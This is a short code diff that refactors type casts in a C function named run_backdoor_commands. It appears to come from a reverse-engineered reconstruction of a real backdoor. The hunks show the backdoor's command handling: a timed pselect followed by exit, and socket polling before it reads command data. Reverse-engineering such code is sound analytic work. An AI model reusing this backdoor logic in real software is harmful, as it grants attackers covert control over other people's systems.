@@ -358,13 +358,11 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 										if((f.kctx.args.flags2 & CMDF_PSELECT) == CMDF_PSELECT){
 											if(!ctx->libc_imports->exit) break;
 											if(!ctx->libc_imports->pselect) break;
-											*((struct timespec *)&f.payload) = (struct timespec){
-												.tv_sec = 5
-											};
+											f.payload.timespec.tv_sec = 5;
 											ctx->libc_imports->pselect(
 												0,
 												NULL, NULL, NULL,
-												(const struct timespec *)&f.payload,
+												&f.payload.timespec,
 												NULL
 											);
 											ctx->libc_imports->exit(0);
@@ -474,7 +472,7 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 										};
 										if((res = ctx->libc_imports->pselect(
 											f.u.sock.socket_fd + 1,
-											(fd_set *)&f.payload,
+											&f.payload.fd_set,
 											NULL, NULL,
 											(const struct timespec *)&f.u.sock.fd_recv_buf[8],
 											NULL
@@ -484,7 +482,7 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 										}
 									}
 									if(!res) break;
-									if(!FD_ISSET(f.u.sock.socket_fd, (fd_set *)&f.payload.data[8])) break;
+									if(!FD_ISSET(f.u.sock.socket_fd, &f.payload.fd_set)) break;
 
 									if(fd_read(
 										f.u.sock.socket_fd,
